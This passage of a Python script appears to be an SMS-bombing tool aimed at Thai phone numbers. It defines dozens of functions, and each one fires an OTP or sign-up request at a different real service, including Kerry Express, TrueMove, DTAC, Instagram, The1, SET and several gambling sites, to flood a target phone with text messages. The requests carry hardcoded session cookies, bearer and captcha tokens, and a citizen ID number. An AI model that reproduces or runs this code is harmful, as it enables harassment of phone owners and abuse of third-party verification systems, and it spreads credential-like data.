            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa11():
        try:
            requests.post("https://ufaclub99.com/member/Register/Request_OTP",headers={
                "accept": "*/*",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "x-requested-with": "XMLHttpRequest",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
                "origin": "https://ufaclub99.com",
                "referer": "https://ufaclub99.com/member/register",
                "cookie": "ci_session=re834geqv85ugp62u6v88i9n15ub5qin"
                },data=f"phonetxt={phone}")
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa12():
        try:
            requests.post("https://aff.ufaclub24.org/pin.php",headers={
                "origin": "https://aff.ufaclub24.org",
                "content-type": "application/x-www-form-urlencoded",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "referer": "https://aff.ufaclub24.org/phoneregis.php?invitekey=41bfd20a38bb1b0bec75acf0845530a7",
                "cookie": "PHPSESSID=n6da80gl0j6u7ob1ltlseb5m6p;_ga=GA1.2.18658305.1649308092;_gid=GA1.2.1210153607.1649308092;_gat_gtag_UA_155192447_2=1"
                },data=f"invitekey=41bfd20a38bb1b0bec75acf0845530a7&txtTel={phone}")
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa13():
        try:
            requests.post("https://ufa8.co/register",headers={
                "origin": "https://ufa8.co",
                "content-type": "application/x-www-form-urlencoded",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "referer": "https://ufa8.co/register"
                },data=f"register=1&phone={phone}&password=Kan064402&password2=Kan064402&line=Garenarov")
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa14():
        try:
            requests.post("https://topping.truemoveh.com/api/get_request_otp", data=f"mobile_number={phone}", headers={
        "Accept": "application/json, text/plain, /",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://topping.truemoveh.com/otp?callback=/campaign/104",
        "Cookie": "_ga=GA1.2.1205060554.1640098569; _gcl_au=1.1.1987856152.1640098570; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A57%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; _fbp=fb.1.1640098573194.360235747; wisp-https%3A%2F%2Fapp.getwisp.co-Ly7y=88ce9a24-a734-4ee0-a698-20f8eddb4942; _gac_UA-34289891-14=1.1640601367.Cj0KCQiA5aWOBhDMARIsAIXLlkfb9M64-nkR8u0vdLiqqAhHzV1TK-wuYhvA4nvc76GLMd_LvbDYizMaAruSEALw_wcB; ci_session=dbskqg6a8lqknf9n1cep0jb5vrrhkqdi; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF7868D84BE668BFDE38423D810F8497FAC88813163C52320060AF1A0D59D6D0AECF99D0389471FA83C1B90863201109E903015CCAF2CCBA3F11A5EDD799554400EE1; _gid=GA1.2.1638141276.1641466031; _gac_UA-41231050-25=1.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat=1; _gcl_aw=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gcl_dc=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat_UA-41231050-25=1; wisepops_visits=%5B%222022-01-06T10%3A47%3A11.626Z%22%2C%222022-01-04T16%3A54%3A03.887Z%22%2C%222021-12-28T10%3A38%3A18.612Z%22%2C%222021-12-28T10%3A38%3A04.394Z%22%2C%222021-12-28T10%3A37%3A40.387Z%22%2C%222021-12-27T03%3A47%3A11.187Z%22%2C%222021-12-25T12%3A27%3A55.196Z%22%2C%222021-12-23T17%3A48%3A39.146Z%22%2C%222021-12-21T17%3A56%3A55.678Z%22%2C%222021-12-21T15%3A06%3A46.971Z%22%5D; wisepops_session=%7B%22arrivalOnSite%22%3A%222022-01-06T10%3A47%3A11.626Z%22%2C%22mtime%22%3A1641466036863%2C%22pageviews%22%3A2%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm%22%3A%7B%22gclid%22%3A%22yes%22%7D%2C%22testIp%22%3Anull%7D"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa15():
        try:
            requests.post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}")
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa16():
        try:
            requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/", headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"}, json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa17():
        try:
            requests.post("https://www.bigthailand.com/authentication-service/user/OTP", json={"locale":"th","phone": f"+66{phone[1:]}","email":"dkdk@gmail.com","userParams":{"buyerName":"ekek ks","activateLink":"www.google.com"}}, headers={"content-type": "application/json","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..P9LOZOUnXvgw5wDxPqSuCg.jjRU6v4iidkFNv4nROigeng1s9e96LnzplOaml7YSasaTxwozO37IWuq-h6bV5JyxpaRvIL9UCochw-3OciWq_VrORNwnH45b-ziIAhZ-CpLpt1O_4EpM27y7TYXBb_w6DT3BJp1ARkG7CqSouTnGg.2n1G9HbFJzArFH5Rr2m9kg","cookie": "auth.strategy=local;auth._token.local=Bearer%20eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..P9LOZOUnXvgw5wDxPqSuCg.jjRU6v4iidkFNv4nROigeng1s9e96LnzplOaml7YSasaTxwozO37IWuq-h6bV5JyxpaRvIL9UCochw-3OciWq_VrORNwnH45b-ziIAhZ-CpLpt1O_4EpM27y7TYXBb_w6DT3BJp1ARkG7CqSouTnGg.2n1G9HbFJzArFH5Rr2m9kg;_utm_objs=eyJzb3VyY2UiOiJnb29nbGUiLCJtZWRpdW0iOiJjcGMiLCJjYW1wYWlnbiI6ImFkd29yZHMiLCJj%0D%0Ab250ZW50IjoiYWR3b3JkcyIsInRlcm0iOiJhZHdvcmRzIiwidHlwZSI6InJlZmVycmVyIiwidGlt%0D%0AZSI6MTY0MjMyOTM5OTU4NSwiY2hlY2tzdW0iOiJaMjl2WjJ4bExXTndZeTFoWkhkdmNtUnpMVEUy%0D%0ATkRJek1qa3pPVGsxT0RVPSJ9;_pk_ref.564990563.2c0e=%5B%22%22%2C%22%22%2C1642329400%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D;_pk_ses.564990563.2c0e=*;_gcl_au=1.1.833577636.1642329400;_asm_visitor_type=n;_ac_au_gt=1642329406505;cdp_session=1;_asm_uid=637506384;_ga=GA1.2.1026893832.1642329403;_gid=GA1.2.1437369318.1642329403;OptanonConsent=isIABGlobal=false&datestamp=Sun+Jan+16+2022+17%3A36%3A45+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.9.0&hosts=&consentId=e0fe7ec6-3c1e-4aa7-9e72-ecd2ed724416&interactionCount=0&landingPath=https%3A%2F%2Fwww.bigthailand.com%2Fcategory%2F850%2F%25E0%25B8%2599%25E0%25B9%2589%25E0%25B8%25B3%25E0%25B8%25A1%25E0%25B8%25B1%25E0%25B8%2599%25E0%25B9%2580%25E0%25B8%2584%25E0%25B8%25A3%25E0%25B8%25B7%25E0%25B9%2588%25E0%25B8%25AD%25E0%25B8%2587%25E0%25B9%2581%25E0%25B8%25A5%25E0%25B8%25B0%25E0%25B8%2582%25E0%25B8%25AD%25E0%25B8%2587%25E0%25B9%2580%25E0%25B8%25AB%25E0%25B8%25A5%25E0%25B8%25A7%2F%25E0%25B8%2599%25E0%25B9%2589%25E0%25B8%25B3%25E0%25B8%25A1%25E0%25B8%25B1%25E0%25B8%2599%25E0%25B9%2580%25E0%25B8%2584%25E0%25B8%25A3%25E0%25B8%25B7%25E0%25B9%2588%25E0%25B8%25AD%25E0%25B8%2587%3Fgclid%3DCj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CC0007%3A1;_fbp=fb.1.1642329406623.363807498;_hjSessionUser_2738378=eyJpZCI6ImVkNmZhOGY3LTQwNDctNTNjMi04YTVjLTQ0OGE5MDA4YjhiZCIsImNyZWF0ZWQiOjE2NDIzMjk0MDQ4MDMsImV4aXN0aW5nIjpmYWxzZX0=;_hjFirstSeen=1;_hjIncludedInSessionSample=0;_hjSession_2738378=eyJpZCI6ImNhN2UwZDFhLTZkNmQtNGM0Mi04YmI1LTg4NWJmNzZjMGExZCIsImNyZWF0ZWQiOjE2NDIzMjk0MTEwNzcsImluU2FtcGxlIjpmYWxzZX0=;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=0;_gac_UA-165856282-1=1.1642329477.Cj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB;_gcl_aw=GCL.1642329478.Cj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB;_pk_id.564990563.2c0e=0.1642329400.1.1642329489.1642329400.;_ac_client_id=637515726.1642329496;_ac_an_session=zmzlzhzlzizqzmzjzkzjzdzlzgzkzmzizmzkzhzlzdzizlznzhzgzhzqznzqzlzdzizdzizlznzhzgzhzqznzqzlzdzizlznzhzgzhzqznzqzlzdzizdzgzjzizdzjzd2h25zdzgzdzezizd;au_id=637515726;_ga_80VN88PBVD=GS1.1.1642329399.1.1.1642329493.44"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa18():
        try:
            requests.get(f"https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=66{phone[1:]}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2")
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa19():
        try:
            requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register", json={"username":phone,"password":"1111a1111A","name":phone,"provinceCode":"74","districtCode":"970","subdistrictCode":"8654","zipcode":"94140","siebelCustomerTypeId":"710","locale":"th_TH"}, headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa20():
        try:
            requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on": {"value": phone,"country": "66"},"type": "mobile"},headers={"accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa21():
        try:
            requests.post("https://login.s-momclub.com/accounts.otp.sendCode", data=f"phoneNumber=%2B66{phone[1:]}&lang=th&APIKey=3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC&source=showScreenSet&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fwww.s-momclub.com%2Fprofile%2Flogin&sdkBuild=12563&format=json", headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "gmid=gmid.ver4.AcbHriHAww._ill8qHpGNXtv9aY3XQyCvPohNww4j7EtjeiM3jBccqD7Vx0OmGeJuXcpQ2orXGs.nH0yRZjbm75C-5MVgB2Ii0PWvx6TICBn1LYI_XtlgoHg9mnouZgNs6CHULJEitOfkBhHvf8zUvrvMauanc52Sw.sc3;ucid=Tn63eeu2u8ygoINkqYBk5w;hasGmid=ver4;_ga=GA1.2.1714152564.1642328595;_fbp=fb.1.1642328611770.178002163;_gcl_au=1.1.64457176.1642329285;gig_bootstrap_3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC=login_ver4;_gid=GA1.2.1524201365.1642442639;_gat=1;_gat_rolloutTracker=1;_gat_globalTracker=1;_gat_UA-62402337-1=1"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa22():
        try:
            requests.post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661", headers={"User-Agent": useragent}, json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone": f"+66{phone[1:]}","type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName": "dec"}})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
            requests.post("https://www.carsome.co.th/website/login/sendSMS", json={"username":phone,"optType":0})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa24():
        try:
            requests.post("https://gamingnation.dtac.co.th/api/otp/request",json={"template":"register","phone_no":phone,"token":"03AGdBq257kzKUMJ1ob4zTwDWOVXpLdk4FcMHa_nwlf3xt816SvNfzramnqWTE-yrfjWuQHjNlBrgAZlqspYl-5EH6anY7qorOpa_OmjqLK0TeTajlqAeJLh-jd3QfJyjKbPT1ralDApTC5PHpdGVMQ2sdbX3GKPjpGy2-9r27Kgd8ZF2JUuTgrNIS3ljBDYjuAqt6Rbn0me7ikEd0Ns7a3VXL5Gs8UkiOojLgFh5WK8J80zymilWxqkVQX0-KI_NaDcZKDuWwMHzs2-W68U8qbUUb4B0kNfzwfH9PcftDbdbCPZ43ZcWF2xepsvXhIXIipMawBK3H6fvwmUa1G9_-5I9c-DuPnTi7gq27SV12i4uxwwlpzNpNnofPmZ8vOv9tzxgoHCWkCbMgJVPYRl-PogXqpZBLhXHawb2FGxx--OjKuraWRLRg1-nC-ZK0_xcOCTqjCad-dDyP49aC2BWRlJd8VhskCzH0S4B-I6lRg78qSWV3mQ1vbNrsp_Xk3pjfiilZqznCkPLN29vpVezJIyweRKYTMFlV1Q"},headers={"User-Agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36","Cookie":"i18n_redirected=th; _gcl_au=1.1.1259613914.1645770250; _fbp=fb.2.1645770253711.1894109895; _hjSessionUser_2510409=eyJpZCI6IjY1NDUxZTZiLTMxNDYtNWY2NS1iZTI5LTJlYTg2YTUxZWRiMiIsImNyZWF0ZWQiOjE2NDU3NzAyNTM1NTUsImV4aXN0aW5nIjp0cnVlfQ==; v10DeviceID=76d43cf572c2921a5fb598a66248e158; v10UA=DTAC%2F10.0%2Fweb%2F1.0%2FNetworkType%2F76d43cf572c2921a5fb598a66248e158%2FM2006C3LG-Chrome; fromApp=dtacLite; v10Lang=th; OptanonAlertBoxClosed=2022-02-25T06:31:00.287Z; _hjSessionUser_1100693=eyJpZCI6ImUzMWM2NjcyLTBjMzAtNTIxZC05ZDdiLTFlNjg3NTc4ZjkxZSIsImNyZWF0ZWQiOjE2NDU3NzA2ODE3NTUsImV4aXN0aW5nIjp0cnVlfQ==; _ga=GA1.3.176519351.1645770253; OptanonConsent=isIABGlobal=false&datestamp=Fri+Feb+25+2022+13%3A33%3A21+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.15.0&hosts=&consentId=cd42bf1d-c1ac-4a3f-b20c-54d16145aa24&interactionCount=2&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CC0004%3A1&geolocation=TH%3B84&AwaitingReconsent=false; cto_bundle=2wShxV91OFdyc3NvNVQ5TUZ3VFZzM0JkOWlQSFMxZU8xMXF2Y3VxR1RWJTJGOTcySkVCU3VqZ09haVByaHVNT3hjQTY0VUQyTHF6WXhVMEl0Um1KUDZVTFh3JTJGdWxOck9VZ1U3aDNVYVBJVyUyQnB3dXAwWThlR2tvMnh1WlRTWlRjU3hscGxaZkxkJTJGWUhXeVI4dUJHb2MwcnNiNXVyQSUzRCUzRA; _ga_EGFFCDXTW2=GS1.1.1645770681.1.1.1645770804.0; _gid=GA1.3.1993109359.1647399772; auth.strategy=local; _gat_UA-16732483-1=1; _hjIncludedInSessionSample=0; _hjSession_2510409=eyJpZCI6IjIyNGE1NzFlLTdhOTUtNDMzNC1iMjE2LWVhNjc5YzIwNjA4MSIsImNyZWF0ZWQiOjE2NDc0MDY0NzAyOTAsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa25():
        try:
            requests.post("https://api.1112delivery.com/api/v1/otp/create",headers={"User-Agent": useragent},json={'phonenumber': f"{phone}", 'language': "th"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa26():
        try:
            requests.post("https://api2.1112.com/api/v1/otp/create",headers={"User-Agent": useragent},json={'phonenumber'   : f"{phone}", 'language': "th"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa27():
        try:
            requests.get(f"https://hdmall.co.th/phone_verifications?express_sign_in=1&mobile={phone}")
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa28():
        try:
            requests.post("https://www.kaitorasap.co.th/api/index.php/send-otp-login/",headers={"Accept": "application/json, text/javascript, /; q=0.01","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Cookie": "PHPSESSID=080ugg4928ulkhj6kaggiqkvd1; _ga=GA1.3.1856390916.1657557339; _gid=GA1.3.1103002458.1657557339; _gat_gtag_UA_141105037_1=1; G_ENABLED_IDPS=google"},data=f"phone_number={phone}&lag=")
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa29():
        try:
            requests.post("https://api.freshket.co/baseApi/Users/RequestOtp",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type": "application/json;charset=UTF-8"},json={"isDev":"false","language":"th","phone":f"+66{phone[1:]}"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa30():
        try:
            requests.get(f"https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=0{phone}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2")
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa32():
        try:
            requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%R3.mnux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa33():
        try:
            requests.post("https://mapi.konglor888.com/api/otp/register",json={"applicant":f"{phone}","serviceName":"konglor888.com"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa34():
        try:
            requests.post("https://mapi.hit789.com/api/otp/register",json={"applicant":f"{phone}","serviceName":"hit789.com"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa35():
        try:
            requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp",json={"msisdn":f"{phone}","function":"enroll"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa36():
        try:
            requests.post("https://lb-api.fox83-sy.xyz/api/otp/register",json={"applicant":f"{phone}","serviceName":"fox888.com"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa37():
        try:
            requests.post("https://ezregis01.com/_ajax_/register/request-otp",json={"phoneNumber":f"{phone}","affSign":"e1af462f54b57749cb61e4ac010fd0ee"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa38():
        try:
            requests.post("https://mapi.dung919.com/api/otp/register",json={"applicant":f"{phone}","serviceName":"dung919.com"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def ig_token():
        d=get("https://www.instagram.com/",headers=headers).headers['set-cookie']
        d=search("csrftoken=(.*);",d).group(1).split(";")
        return d[0],d[10].replace(" Secure, ig_did=","")

    def newa39():
        try:
            token,cid=ig_token()
            requests.post("https://www.instagram.com/accounts/send_signup_sms_code_ajax/",data=f"client_id={cid}&phone_number=66{phone}&phone_id=&big_blue_token=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","X-CSRFToken":token}).json()
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa41():
        try:
            requests.post("https://api.set.or.th/api/member/registration​",json={"citizenId":"1840201297389","passport":"","country":"th","termFlag":"true","subscriptionFlag":"true","email":"bdjsss@gmail.com","password":"090Kkk12","gender":"M","firstName":"แวหยกกว","lastName":"กวยกจแวกวก","mobile":f"+66{phone}","captcha":"03AIIukzjHWhfsTpFpujjNmHQnFczifaX2EAd6iHyG_pqg769Dtpj4stj_E13Lg5Tj2LC5gEq0Es5EiMQa3E-Kl6h25rKm890hlxWQcwgOImpWS5BE-vCC0n_SiKPrHzfW-TLU2n1DLpJzVBooR1DZLt_DDtTxvZhap6YDR9m42kJBcIh3rTuhsYavsJ7daNTjzBqo9V7XuHuAjW_o7Bd1RXNhaLEFwJquoTkkjpvT2vjLVmzinm9Kgxr9GWpl-fuCr4GYRwXDydLBKjU-CwqrNk7elYhedS83VlIla_gtH6hF7HuLEvzU_FLt4V622MJIEPwZaAc6ivQjnibX_PwAS1evs67p7GH4CZn7JOE6VCSWDLC6wsz_um4bzygapb9_xjH6U_FhEz-6uIByc9VXlRtBoFHrLEDQhFlwHEqqG3wOS_HY2yPJReDuWgmbTVbdLXGSDf98tYZccz68n4u3g5McEYtIDo6afVObd-7LPcnK3uvi5CqIjoh3cvzyD4j9z5sLNS1yLibOnX6OGPTkG0trp-pjVOICPQ"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa40():
        try:
            requests.post("https://api.set.or.th/api/otp/request",json={"type":"REGISTRATION","refID":"e865e7a6-e8c7-4adc-a204-90e5bca90ce0","channel":"MOBILE"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def newa42():
        try:
            h = Session()
